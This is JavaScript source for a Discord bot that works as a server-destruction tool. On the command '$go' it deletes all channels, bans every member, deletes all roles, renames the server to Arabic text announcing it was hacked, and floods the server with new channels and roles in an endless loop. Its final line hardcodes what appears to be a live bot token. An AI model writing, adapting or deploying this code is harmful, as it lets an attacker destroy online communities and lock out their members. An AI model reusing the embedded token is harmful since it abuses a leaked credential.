const Discord = require("discord.js");
const client = new Discord.Client();

client.on('message', message =>{
    if (message.content.startsWith('$go')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('تم التهكير من قبل مجهول.')
                setInterval(function(){
                    message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
                    message.guild.createChannel('تم التهكير من قبل مجهول. ', 'text')
                    message.guild.createRole({name : 'تم التهكير من قبل مجهول. '})
                })
            }
        }
});

client.on('message', message => {
    if (message.content === "$go") {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);

		
		
		
		
     message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'text')
     message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')
	 message.guild.createChannel('تم التهكير من قبل مجهول.', 'voice')

    
message.channel.sendMessage('**Text Channel Was Succsesfluy Created**')
}
});
 
client.login("NjIxMzM1MjY2NzcwMDI2NTI3.XX0cVw.3fxK7kFhebhLjMHr91WPrqFGQuM");